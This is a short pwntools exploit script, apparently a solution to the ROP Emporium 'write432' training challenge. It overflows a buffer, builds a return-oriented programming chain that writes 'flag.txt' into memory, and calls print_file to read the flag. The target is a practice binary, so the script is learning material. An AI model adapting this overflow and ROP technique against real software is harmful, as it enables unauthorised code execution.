from pwn import *

elf = ELF("./write432")

p = process("./write432")
p.recvuntil('> ')

mov_edi_ebp = p32(0x08048543)
pop_edi_ebp = p32(0x080485aa)
writable_area = 0x0804a018

rop = b''
rop += pop_edi_ebp + p32(writable_area) + b'flag' + mov_edi_ebp
rop += pop_edi_ebp + p32(writable_area+4) + b'.txt' + mov_edi_ebp 
rop += p32(elf.symbols['print_file']) + b'aaaa' + p32(writable_area)

p.send(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + rop)
					   

p.interactive()

#p.clean()
#p.sendline(b'cat flag.txt')
#print(p.recv().decode())
